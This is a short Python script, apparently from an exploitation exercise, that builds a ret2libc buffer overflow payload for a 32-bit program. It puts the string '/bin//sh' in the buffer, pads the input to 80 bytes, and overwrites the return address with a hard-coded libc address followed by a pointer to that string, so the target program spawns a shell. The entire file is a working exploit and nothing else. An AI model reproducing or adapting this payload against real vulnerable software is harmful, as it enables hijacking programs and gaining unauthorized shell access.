#! /usr/bin/python

length = 80

shell = '/bin//sh\x00'

padding = 'a' * (length - len(shell))

#0xbffffc7c
buffer = '\x7c\xfc\xff\xbf'

#0xb7ecffb0
ret_addr = '\xb0\xff\xec\xb7'

payload = shell + padding + ret_addr + '\x61\x61\x61\x61' + buffer

print(payload)


